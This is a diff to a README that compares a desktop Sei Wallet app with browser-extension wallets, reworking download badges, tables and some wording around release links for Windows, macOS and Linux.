@@ -5,23 +5,27 @@
 <p align="center">Two ways to hold SEI, and the trade each one makes in practice.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-The choice is not about which is more secure in the abstract. It is about where the signing request comes from. A browser extension lives inside the page and signs when a website asks; a desktop application lives outside the browser and signs when you bring a transaction to it. That single difference decides most of what follows — the convenience, the exposure, and the kind of mistake each shape invites.
+For most people the desktop Sei Wallet is the safer default, because the signing request comes from outside the browser instead of from the page itself. A browser extension lives inside the page and signs when a website asks; a desktop application lives outside the browser and signs when you bring a transaction to it. That single difference decides most of what follows - the convenience, the exposure, and the kind of mistake each shape invites.
 
 Sei Wallet is a desktop application. The extension route means a different wallet, usually a general EVM one, with Sei added as a network.
 
@@ -35,10 +39,12 @@ Neither shape is safe by itself. Each removes one class of risk and adds another
 
 ## Side by side
 
+<div align="center">
+
 | | Desktop application | Browser extension |
 |---|---|---|
 | Signing prompt origin | Inside the app, on your initiative | Injected provider, on a site's request |
-| Exposure to malicious pages | Low — no page-level hook | Direct — the page can request signatures |
+| Exposure to malicious pages | Low - no page-level hook | Direct - the page can request signatures |
 | Update surface | Whole application, from the vendor's domain | Extension package from a store |
 | Typical failure mode | Fake installer | Fake extension listing |
 | Multi-chain support | Single chain (Sei) | Usually many |
@@ -46,7 +52,9 @@ Neither shape is safe by itself. Each removes one class of risk and adds another
 | Hardware wallet | Supported | Supported, often through the same app |
 | Mobile | No | Depends on the wallet |
 
-The row that matters most is the first. A signing prompt that a page can raise is convenient precisely because it is easy to trigger — including by a site you did not mean to visit.
+</div>
+
+The row that matters most is the first. A signing prompt that a page can raise is convenient precisely because it is easy to trigger - including by a site you did not mean to visit.
 
 ## The security trade, stated honestly
 
@@ -66,7 +74,7 @@ Three facts decide most of the practical questions:
 2. **It signs EVM transactions natively**, with read-only display of legacy Cosmos addresses.
 3. **Staking is built in**, including the validator picker and unbonding.
 
-The shape of the product is covered in [this desktop app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md), and the setup itself in [the setup walkthrough](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md).
+The shape of the product is covered in [this desktop app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md), and the setup itself in [the Sei Wallet setup guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-create-an-account.md).
 
 One thing I did not verify: how this desktop application connects to web applications, whether through a handoff protocol, a pairing code, or not at all. The product's own documentation is the place to check, and I would rather say that than describe a flow I did not confirm.
 
@@ -100,13 +108,13 @@ Three ways to do it more safely:
 - **Import once, then stop.** Avoid re-importing the phrase repeatedly; each entry is a chance to mistype it into something that is not the wallet.
 - **Remove what you do not use.** A dormant wallet you installed to try is still an attack surface.
 
-Restoring an existing phrase into a second application reproduces your existing accounts, which is convenient and also means the second app now has access to the same funds. The mechanics, including what to expect when the addresses look different afterwards, are in [the restore path](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md).
+Restoring an existing phrase into a second application reproduces your existing accounts, which is convenient and also means the second app now has access to the same funds. The mechanics, including what to expect when the addresses look different afterwards, are in [the Sei Wallet restore guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md).
 
 ## If you are choosing between ecosystems, not shapes
 
-The desktop-versus-extension question is one axis. The other is which ecosystem's wallet you want, and a Cosmos-first wallet is a genuinely different answer rather than a different packaging: it produces `sei1…` addresses, it talks to a different app on a Ledger, and it covers many chains. That comparison is in [the Cosmos wallet comparison](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md).
+The desktop-versus-extension question is one axis. The other is which ecosystem's wallet you want, and a Cosmos-first wallet is a genuinely different answer rather than a different packaging: it produces `sei1...` addresses, it talks to a different app on a Ledger, and it covers many chains. That comparison is in [the Cosmos wallet comparison](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md).
 
-There is also a third category — an in-app or hosted wallet, where the key handling is not in your hands the same way. It is not a build of the same product under a different name, and treating the two names as interchangeable is how people end up with an account nobody can help them recover.
+There is also a third category - an in-app or hosted wallet, where the key handling is not in your hands the same way. It is not a build of the same product under a different name, and treating the two names as interchangeable is how people end up with an account nobody can help them recover.
 
 ## Frequently asked questions
 
@@ -126,11 +134,15 @@ There is also a third category — an in-app or hosted wallet, where the key han
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
